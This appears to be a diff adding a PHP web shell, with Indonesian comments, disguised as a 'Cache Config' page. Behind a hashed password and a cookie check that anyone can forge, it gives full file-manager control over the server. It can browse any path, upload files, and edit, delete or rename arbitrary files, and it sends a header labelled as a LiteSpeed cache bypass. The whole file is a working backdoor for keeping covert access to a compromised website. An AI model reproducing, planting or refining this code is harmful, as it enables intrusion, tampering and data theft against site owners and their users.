@@ -1,0 +1,244 @@
+<?php
+session_start();
+
+// === KONFIGURASI PASSWORD (hash md5 tetap seperti asli) ===
+$stored_hash = "14bc157c42d8242fb9f7905a65b88bfc";
+
+// Bypass Litespeed
+header("X-LiteSpeed-Purge: *");
+
+// Proses login via cookie
+if (!isset($_COOKIE['auth'])) {
+    if (isset($_POST['p'])) {
+        $input_hash = md5($_POST['p']);
+        if ($input_hash === $stored_hash) {
+            setcookie('auth', '1', time() + 86400 * 30, "/"); // 30 hari
+            header("Location: " . $_SERVER['REQUEST_URI']);
+            exit;
+        } else {
+            $err = 1;
+        }
+    }
+
+    // Form login minimalis & polos
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Cache Config</title>
+        <style>
+            body { font-family: Arial, sans-serif; background:#f5f5f5; margin:0; padding:0; display:flex; align-items:center; justify-content:center; height:100vh; }
+            .box { background:#fff; padding:30px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:320px; text-align:center; }
+            input { width:100%; padding:12px; margin:10px 0; border:1px solid #ddd; border-radius:4px; box-sizing:border-box; }
+            button { width:100%; padding:12px; background:#4a90e2; color:white; border:none; border-radius:4px; cursor:pointer; }
+            button:hover { background:#357abd; }
+            .err { color:#e74c3c; margin:10px 0; }
+        </style>
+    </head>
+    <body>
+        <div class="box">
+            <h3>Configuration</h3>
+            <?php if(isset($err)) echo '<p class="err">Invalid access</p>'; ?>
+            <form method="post">
+                <input type="password" name="p" placeholder="Access key" required autofocus>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cache</title>
+    <meta charset="utf-8">
+    <style>
+        body { font-family: Arial, sans-serif; background:#1e1e1e; color:#e0e0e0; margin:0; padding:15px; font-size:14px; }
+        a { color:#4a90e2; text-decoration:none; }
+        a:hover { color:#fff; text-shadow:0 0 5px #4a90e2; }
+        table { width:100%; border-collapse:collapse; margin:10px 0; }
+        th, td { padding:8px; text-align:left; border:1px solid #333; }
+        th { background:#2c2c2c; }
+        tr:hover { background:#2a2a2a; }
+        .dir { color:#7fdbff; font-weight:bold; }
+        .file { color:#e0e0e0; }
+        .perm-green { color:#2ecc71; }
+        .perm-red { color:#e74c3c; }
+        .size { text-align:right; }
+        input, select, textarea { background:#333; color:#e0e0e0; border:1px solid #555; padding:5px; border-radius:3px; width:100%; box-sizing:border-box; }
+        button { background:#4a90e2; color:white; border:none; padding:6px 12px; border-radius:3px; cursor:pointer; }
+        button:hover { background:#357abd; }
+        .msg { padding:10px; margin:10px 0; border-radius:4px; }
+        .ok { background:#27ae60; color:white; }
+        .fail { background:#c0392b; color:white; }
+        .edit-area { margin:15px 0; }
+        textarea { height:400px; font-family:Consolas, monospace; font-size:13px; }
+    </style>
+</head>
+<body>
+
+<?php
+set_time_limit(0);
+error_reporting(0);
+
+// Fungsi permission string
+function perm($f) {
+    $p = fileperms($f);
+    $s = '';
+    $s .= (($p & 0x8000) ? '-' : (($p & 0x4000) ? 'd' : 'l'));
+    $s .= (($p & 0x0100) ? 'r' : '-');
+    $s .= (($p & 0x0080) ? 'w' : '-');
+    $s .= (($p & 0x0040) ? 'x' : '-');
+    $s .= (($p & 0x0020) ? 'r' : '-');
+    $s .= (($p & 0x0010) ? 'w' : '-');
+    $s .= (($p & 0x0008) ? 'x' : '-');
+    $s .= (($p & 0x0004) ? 'r' : '-');
+    $s .= (($p & 0x0002) ? 'w' : '-');
+    $s .= (($p & 0x0001) ? 'x' : '-');
+    return $s;
+}
+
+// Fungsi cek writable
+function is_w($p) {
+    return is_writable($p) ? '<span class="perm-green">Writable</span>' : '<span class="perm-red">Not Writable</span>';
+}
+
+// Path handling
+$path = isset($_GET['p']) ? realpath($_GET['p']) : getcwd();
+if (!$path || !is_dir($path)) $path = getcwd();
+
+$path = str_replace('\\', '/', $path);
+$parts = explode('/', trim($path, '/'));
+
+echo '<div>Path: ';
+echo '<a href="?p=/">/</a>';
+$accum = '/';
+foreach ($parts as $part) {
+    if ($part === '') continue;
+    $accum .= $part . '/';
+    echo '<a href="?p=' . urlencode($accum) . '">' . htmlspecialchars($part) . '</a>/';
+}
+echo '</div>';
+
+echo '<div>Status: ' . is_w($path) . ' | Perm: ' . substr(sprintf('%o', fileperms($path)), -4) . '</div><br>';
+
+// === HANDLE UPLOAD ===
+if (isset($_FILES['f']) && $_FILES['f']['error'] == 0) {
+    $target = $path . '/' . basename($_FILES['f']['name']);
+    if (move_uploaded_file($_FILES['f']['tmp_name'], $target)) {
+        echo '<div class="msg ok">File uploaded: ' . htmlspecialchars(basename($target)) . '</div>';
+    } else {
+        echo '<div class="msg fail">Upload failed</div>';
+    }
+}
+
+// === HANDLE EDIT FILE ===
+if (isset($_GET['edit'])) {
+    $edit_file = realpath($_GET['edit']);
+    if (is_file($edit_file) && is_readable($edit_file)) {
+        if (isset($_POST['save'])) {
+            $content = $_POST['content'];
+            if (file_put_contents($edit_file, $content) !== false) {
+                echo '<div class="msg ok">File saved successfully</div>';
+            } else {
+                echo '<div class="msg fail">Failed to save file (permission?)</div>';
+            }
+        }
+
+        $content = file_get_contents($edit_file);
+        echo '<div class="edit-area">
+            <h3>Editing: ' . htmlspecialchars(basename($edit_file)) . '</h3>
+            <form method="post">
+                <textarea name="content">' . htmlspecialchars($content) . '</textarea><br>
+                <button type="submit" name="save">Save Changes</button>
+                <a href="?p=' . urlencode($path) . '" style="margin-left:15px; color:#aaa;">Cancel</a>
+            </form>
+        </div>';
+        // Keluar setelah menampilkan editor
+        goto end;
+    } else {
+        echo '<div class="msg fail">Cannot edit file</div>';
+    }
+}
+
+// === HANDLE HAPUS FILE ===
+if (isset($_GET['del'])) {
+    $del_file = realpath($_GET['del']);
+    if (is_file($del_file)) {
+        if (@unlink($del_file)) {
+            echo '<div class="msg ok">File deleted</div>';
+        } else {
+            echo '<div class="msg fail">Failed to delete file</div>';
+        }
+    } else {
+        echo '<div class="msg fail">Not a file or invalid path</div>';
+    }
+}
+
+// === HANDLE RENAME ===
+if (isset($_GET['ren'])) {
+    $ren_file = realpath($_GET['ren']);
+    if (isset($_POST['newname'])) {
+        $new_path = dirname($ren_file) . '/' . $_POST['newname'];
+        if (@rename($ren_file, $new_path)) {
+            echo '<div class="msg ok">Renamed to: ' . htmlspecialchars($_POST['newname']) . '</div>';
+        } else {
+            echo '<div class="msg fail">Rename failed</div>';
+        }
+    }
+    echo '<div>
+        <form method="post">
+            New name: <input type="text" name="newname" value="' . htmlspecialchars(basename($ren_file)) . '" style="width:300px;">
+            <button type="submit">Rename</button>
+        </form>
+    </div><br>';
+}
+
+// Tampilan upload
+echo '<form enctype="multipart/form-data" method="post">
+    <input type="file" name="f" style="color:#e0e0e0;">
+    <button type="submit">Upload</button>
+</form><br>';
+
+// Daftar file & folder
+echo '<table>
+    <tr>
+        <th>Name</th>
+        <th>Size</th>
+        <th>Perm</th>
+        <th>Action</th>
+    </tr>';
+
+$items = scandir($path);
+foreach ($items as $item) {
+    if ($item == '.' || $item == '..') continue;
+    $full = $path . '/' . $item;
+    $is_dir = is_dir($full);
+    $size = $is_dir ? '--' : round(filesize($full)/1024, 2) . ' KB';
+    $perm = perm($full);
+    $perm_color = (is_writable($full) ? 'perm-green' : (is_readable($full) ? '' : 'perm-red'));
+
+    echo '<tr>
+        <td>' . ($is_dir ? '<a class="dir" href="?p=' . urlencode($full) . '">' . htmlspecialchars($item) . '</a>' : '<span class="file">' . htmlspecialchars($item) . '</span>') . '</td>
+        <td class="size">' . $size . '</td>
+        <td><span class="' . $perm_color . '">' . $perm . '</span></td>
+        <td>
+            ' . ($is_dir ? '' : '<a href="?edit=' . urlencode($full) . '">Edit</a> | ') . '
+            ' . ($is_dir ? '' : '<a href="?del=' . urlencode($full) . '" onclick="return confirm(\'Hapus file ini?\')">Del</a> | ') . '
+            <a href="?ren=' . urlencode($full) . '">Ren</a>
+        </td>
+    </tr>';
+}
+echo '</table>';
+
+end: // label untuk keluar dari editor
+?>
+
+</body>
+</html>
